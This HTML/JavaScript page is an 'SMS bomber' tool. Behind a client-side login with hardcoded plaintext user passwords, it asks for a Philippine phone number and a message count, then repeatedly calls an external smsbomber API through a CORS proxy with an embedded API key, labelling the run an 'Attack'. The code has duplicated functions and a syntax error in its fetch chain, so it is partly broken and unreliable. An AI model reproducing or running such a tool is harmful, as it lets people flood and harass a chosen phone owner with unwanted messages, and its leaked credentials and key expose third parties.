<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>DA-BEHNCI SMS BOMVACLATTER</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background-color: #020d1b;
      color: #b3e5fc;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
    }

    .card {
      background: #03182f;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 0 20px #00bfff;
      text-align: center;
      width: 380px;
      margin-bottom: 20px;
      position: relative;
    }

    input {
      display: block;
      margin: 12px auto;
      padding: 12px;
      width: 90%;
      background: #062a4e;
      border: 1px solid #00bfff;
      border-radius: 6px;
      color: #b3e5fc;
      font-size: 16px;
      font-weight: bold;
    }

    button {
      padding: 10px 25px;
      background: #00bfff;
      border: none;
      color: #03182f;
      font-weight: bold;
      border-radius: 6px;
      cursor: pointer;
      font-size: 16px;
      margin-top: 10px;
    }

    button:hover {
      background: #00a3cc;
    }

    .log {
      margin-top: 20px;
      height: 200px;
      overflow-y: auto;
      background: #000e1c;
      border-radius: 6px;
      padding: 10px;
      text-align: left;
      font-size: 14px;
      border: 1px solid #00bfff;
    }

    .log-entry {
      margin: 4px 0;
      font-family: monospace;
      color: #00ffcc;
      font-weight: bold;
    }

    .certified-link {
      position: absolute;
      bottom: 12px;
      right: 14px;
      color: #00bfff;
      cursor: pointer;
      font-size: 13px;
      text-decoration: underline;
      font-weight: bold;
    }

    .timer {
      margin-top: 10px;
      font-size: 15px;
      color: #00bfff;
      font-weight: bold;
    }

    h1, h2 {
      margin-top: 0;
      font-weight: bold;
    }

    #loginMessage {
      margin-top: 10px;
      font-size: 13px;
      color: red;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div id="login-section" class="card">
    <h2>Login</h2>
    <input type="text" id="username" placeholder="üë§ Name" />
    <div style="position: relative;">
      <input type="password" id="password" placeholder="üîí Password" />
      <span onclick="togglePassword()" style="position: absolute; right: 25px; top: 14px; cursor: pointer; color: #00bfff;">üëÅÔ∏è</span>
    </div>
    <button onclick="login()">Login</button>
    <div id="loginMessage" class="log-entry"></div>
    <div class="certified-link" onclick="showValidUsers()">üîé Valid Users</div>
  </div>

  <div id="main-section" class="card" style="display: none;">
    <h1>DA-BEHNCI SMS BOMVACLATTER</h1>
    <div id="chancesDisplay" style="margin-bottom: 12px; font-size: 14px; font-weight: bold;"></div>
    <input id="number" placeholder="üì± Phone Number" />
    <input id="count" type="number" placeholder="üîÅ How many messages?" />
    <input id="delay" type="number" placeholder="‚è±Ô∏è Delay (seconds)" />
    <button onclick="startSimulation()">START</button>
    <div class="timer" id="timerDisplay"></div>
    <div class="log" id="logBox"></div>
  </div>

  <script>
const certifiedUsers = [
  { name: "Admin", pass: "Bomva" },
  { name: "Dave", pass: "Gwapo" },
  { name: "Aaron", pass: "Madamba" },
  { name: "Johnsen", pass: "2Pak" },
  { name: "Jaco", pass: "Bowlrat" },
  { name: "Kajo", pass: "Goodjao" },
  { name: "Sam", pass: "Stick-O" },
  { name: "Ivan", pass: "Aeta" },
  { name: "Brix", pass: "Bantor" },
  { name: "Julliana", pass: "Jul2301" },
  { name: "Angel", pass: "Ang0102" },
  { name: "Janelle", pass: "Jan9911" },
  { name: "Sky", pass: "Sky822" },
  { name: "Pauline", pass: "Pau1717" },
  { name: "Julieane", pass: "Jul821" },
  { name: "Mac", pass: "Mac0303" },
  { name: "Cris", pass: "Cris090" },
  { name: "Kiana", pass: "Kia555" },
  { name: "Ericka", pass: "Eri333" },
  { name: "Keith", pass: "Kei888" },
  { name: "Frances", pass: "Fra111" },
  { name: "Tristan", pass: "Tri942" },
  { name: "Mielle", pass: "Mie707" },
  { name: "Joervin", pass: "Joe291" },
  { name: "Vienne", pass: "Vie141" },
  { name: "Jewel", pass: "Jew601" }
];

let currentUser = "";
let userUsage = {};
let lastLogDate = "";

function checkLogReset() {
  const now = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Manila" }));
  const todayStr = `${now.getFullYear()}-${now.getMonth()+1}-${now.getDate()}`;

  if (lastLogDate !== todayStr) {
    lastLogDate = todayStr;
    document.getElementById("logBox").innerHTML = "";  // clear logs
    if (currentUser !== "") updateChancesDisplay();     // refresh chances
  }
}

// Automatically check every 1 minute (adjustable)
setInterval(checkLogReset, 60000);
    
function togglePassword() {
  const pw = document.getElementById("password");
  pw.type = pw.type === "password" ? "text" : "password";
}

function showValidUsers() {
  const visibleUsers = certifiedUsers.filter(u => u.name !== "Admin").map(u => u.name);

  const oldPopup = document.getElementById("validUsersPopup");
  if (oldPopup) oldPopup.remove();

  const popup = document.createElement("div");
  popup.id = "validUsersPopup";
  Object.assign(popup.style, {
    position: "fixed",
    bottom: "20px",
    right: "20px",
    background: "#03182f",
    color: "#00bfff",
    padding: "15px",
    borderRadius: "10px",
    border: "1px solid #00bfff",
    boxShadow: "0 0 10px #00bfff",
    maxHeight: "200px",
    overflowY: "auto",
    zIndex: "9999",
    width: "200px"
  });

  const closeBtn = document.createElement("div");
  closeBtn.textContent = "‚úñ";
  Object.assign(closeBtn.style, {
    position: "absolute",
    top: "5px",
    right: "10px",
    cursor: "pointer",
    fontWeight: "bold",
    color: "#ff6666"
  });
  closeBtn.onclick = () => popup.remove();

  const title = document.createElement("div");
  title.textContent = "üìú Valid Users";
  title.style.fontWeight = "bold";
  title.style.marginBottom = "10px";

  popup.appendChild(closeBtn);
  popup.appendChild(title);

  visibleUsers.forEach(user => {
    const userLine = document.createElement("div");
    userLine.textContent = "‚Ä¢ " + user;
    popup.appendChild(userLine);
  });

  document.body.appendChild(popup);
}
function sendLog(sender, number, result) {
  const logText = `${sender} sent SMS to ${number}: ${result}`;
  console.log("[LOG]", logText); // Optional: Debug output
}

function downloadLog() {
  const log = document.getElementById("logBox").innerText.trim();
  if (!log) {
    alert("‚ö†Ô∏è No log data to save.");
    return;
  }

  const now = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Manila" }));
  const day = now.getDate().toString().padStart(2, '0');
  const month = (now.getMonth() + 1).toString().padStart(2, '0');
  const year = now.getFullYear();
  const filename = `log_${day}-${month}-${year}.txt`;

  const blob = new Blob([log], { type: 'text/plain' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}

function checkLogReset() {
  const now = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Manila" }));
  const todayStr = `${now.getFullYear()}-${now.getMonth() + 1}-${now.getDate()}`;

  if (lastLogDate !== todayStr) {
    lastLogDate = todayStr;
    document.getElementById("logBox").innerHTML = "";
    if (currentUser) updateChancesDisplay();
  }
}

setInterval(checkLogReset, 60000); // Check every minute

function login() {
  const inputName = document.getElementById("username").value.trim();
  const inputPass = document.getElementById("password").value.trim();
  const loginMessage = document.getElementById("loginMessage");
  const found = certifiedUsers.find(u => u.name === inputName && u.pass === inputPass);

  if (!found) return loginMessage.textContent = "‚ùå Invalid credentials.";

  currentUser = found.name;
  document.getElementById("login-section").style.display = "none";
  document.getElementById("main-section").style.display = "block";
  updateChancesDisplay();

  if (currentUser === "Admin") {
    const saveBtn = document.createElement("button");
    saveBtn.textContent = "üì• Save Log";
    saveBtn.onclick = downloadLog;
    document.getElementById("main-section").appendChild(saveBtn);

    const userSelect = document.createElement("select");
    userSelect.id = "adminResetSelect";
    userSelect.style.marginRight = "10px";
    userSelect.style.padding = "5px";
    userSelect.style.borderRadius = "5px";

    const allOption = document.createElement("option");
    allOption.value = "all";
    allOption.textContent = "Reset All Users";
    userSelect.appendChild(allOption);

    certifiedUsers.forEach(user => {
      if (user.name !== "Admin") {
        const opt = document.createElement("option");
        opt.value = user.name;
        opt.textContent = user.name;
        userSelect.appendChild(opt);
      }
    });

    const resetBtn = document.createElement("button");
    resetBtn.textContent = "üîÑ Reset Chances";
    resetBtn.style.marginLeft = "10px";
    resetBtn.onclick = () => {
      const choice = document.getElementById("adminResetSelect").value;
      const today = new Date().toISOString().split("T")[0];
      if (choice === "all") {
        certifiedUsers.forEach(user => {
          if (!userUsage[user.name]) userUsage[user.name] = {};
          userUsage[user.name][today] = { chances: 5 };
        });
        alert("‚úÖ All users' chances have been reset to 5.");
      } else {
        if (!userUsage[choice]) userUsage[choice] = {};
        userUsage[choice][today] = { chances: 5 };
        alert(`‚úÖ ${choice}'s chances have been reset to 5.`);
      }
    };

    document.getElementById("main-section").append(userSelect, resetBtn);
  }
}

function updateChancesDisplay() {
  const today = new Date().toISOString().split("T")[0];
  const used = userUsage[currentUser]?.[today]?.chances || 0;
  document.getElementById("chancesDisplay").textContent =
    currentUser === "Admin" ? "Logged in as Admin" : `Chances Left Today: ${5 - used}`;
}

function downloadLog() {
  const log = document.getElementById("logBox").innerText.trim();

  if (!log) {
    alert("‚ö†Ô∏è No log data to save.");
    return;
  }

  // PH Time (GMT+8)
  const now = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Manila" }));
  const day = now.getDate().toString().padStart(2, '0');
  const month = (now.getMonth() + 1).toString().padStart(2, '0');
  const year = now.getFullYear();

  const filename = `log_${day}-${month}-${year}.txt`;

  const blob = new Blob([log], { type: 'text/plain' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}
    
function startSimulation() {
  let number = document.getElementById("number").value.trim();
  const count = parseInt(document.getElementById("count").value.trim());
  const delay = parseFloat(document.getElementById("delay").value.trim()) || 1.5;
  const logBox = document.getElementById("logBox");
  const timerDisplay = document.getElementById("timerDisplay");
  const api_key = "b7803e277f88d59c3ee050bd866aa2eeaa1a6100bf60a8bca9474b886fceb9d8";

  if (number.length === 10 && number.startsWith("9")) {
    number = "0" + number;
    document.getElementById("number").value = number;
  }

  const isValidNumber = /^09\d{9}$/.test(number);
  if (!isValidNumber || isNaN(count) || count <= 0 || isNaN(delay)) {
    logBox.innerHTML = "<div class='log-entry' style='color: orange;'>‚ö†Ô∏è Invalid phone number, count, or delay.</div>";
    return;
  }

  const today = new Date().toISOString().split("T")[0];
  if (!userUsage[currentUser]) userUsage[currentUser] = {};
  if (!userUsage[currentUser][today]) userUsage[currentUser][today] = { chances: 0 };

  if (currentUser !== "Admin") {
    if (userUsage[currentUser][today].chances >= 5 || count > 20) {
      logBox.innerHTML = "<div class='log-entry' style='color: orange;'>‚ö†Ô∏è Limit reached.</div>";
      return;
    }
    userUsage[currentUser][today].chances++;
    updateChancesDisplay();
  }

  logBox.innerHTML = "";
  timerDisplay.textContent = "üöÄ Starting Attack...";

  let completed = 0;
  for (let i = 1; i <= count; i++) {
    const url = `https://corsproxy.io/?https://haji-mix-api.gleeze.com/api/smsbomber?phone=${encodeURIComponent(number)}&amount=1&api_key=${api_key}`;

    setTimeout(() => {
      fetch(url)
        .then(res => res.json())
        .then(data => {
          const result = data.message || "SMS bombing completed.";
          const log = document.createElement("div");
          log.className = "log-entry";
          log.textContent = `${i.toString().padStart(2, '0')} ‚úÖ ${currentUser} sent SMS to ${number}: ${result}`;
          logBox.appendChild(log);
          logBox.scrollTop = logBox.scrollHeight;
          sendLog(currentUser, number, result);
          completed++;
          if (completed === count) timerDisplay.textContent = "‚úÖ Attack Finished.";
        })
          if (currentUser === "Admin") sendLog(currentUser, number, count);
        
        .catch(error => {
          const log = document.createElement("div");
          log.className = "log-entry";
          log.style.color = "red";
          log.textContent = `${i.toString().padStart(2, '0')} ‚ùå Error: ${error.message}`;
          logBox.appendChild(log);
          logBox.scrollTop = logBox.scrollHeight;
          completed++;
          if (completed === count) timerDisplay.textContent = "‚úÖ Attack Finished.";
        });
    }, i * delay * 1000);
  }
}
</script>
</body>
</html>
